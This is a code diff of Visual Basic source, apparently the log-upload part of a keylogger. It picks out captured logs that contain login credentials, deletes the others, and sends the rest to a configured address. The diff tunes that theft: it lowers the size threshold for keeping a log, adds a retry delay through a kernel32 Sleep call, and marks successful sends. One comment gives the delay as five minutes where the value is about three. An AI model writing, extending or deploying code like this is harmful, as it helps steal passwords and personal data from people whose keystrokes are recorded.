@@ -63,6 +63,8 @@ Public Enum mceIDLPaths
     CSIDL_PROGDATA = &H23
 End Enum
 Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliSeconds As Long)
+
 Public DeleteSentLogs As Boolean, LocalIP, PublicIP As String
 Public sendTo, sendFrom, Password, CompID, RetryTime, LogDir As String
 Private Sub Form_Load()
@@ -83,7 +85,7 @@ While File1.ListCount > 1
     File1.ListIndex = 0                 'Choose first log
     If File1.FileName = CurrLog Then File1.ListIndex = 1 'Dont send todays log
     LogFilePath = File1.Path & "\" & File1.FileName
-    If ReadLog(LogFilePath) < 60 Then       'Load Log content into textbox
+    If ReadLog(LogFilePath) < 40 Then       'Load Log content into textbox
                                         'But Limited User Cant Delete Admin Files
         Kill LogFilePath                'Discard that Log which has nothing like login credentials
     Else
@@ -102,7 +104,7 @@ ReSend:
             'MsgBox "Not Sent : " & LogFilePath
             If Retry >= 3 Then End  'Tried 3 times, still not sent
             Retry = Retry + 1
-            'sleep 3000         'Sleep 5 minutes...
+            Sleep 200000         'Sleep 5 minutes...  5*60*1000
             GoTo ReSend         'Send Again
         End If
     End If
@@ -222,9 +224,11 @@ If Err.Number <> 0 Then
         SendLog = False             'Internet not connected
     Else
         'MsgBox Err.Description: 'Password, Username or any setting might be wrong
-        MsgBox "Error", vbCritical, "Error"
+        MsgBox "Username or password is wrong!", vbCritical, "Error"
         End
     End If
+Else        'err.number=0
+    SendLog = True
 End If
 
 End Function
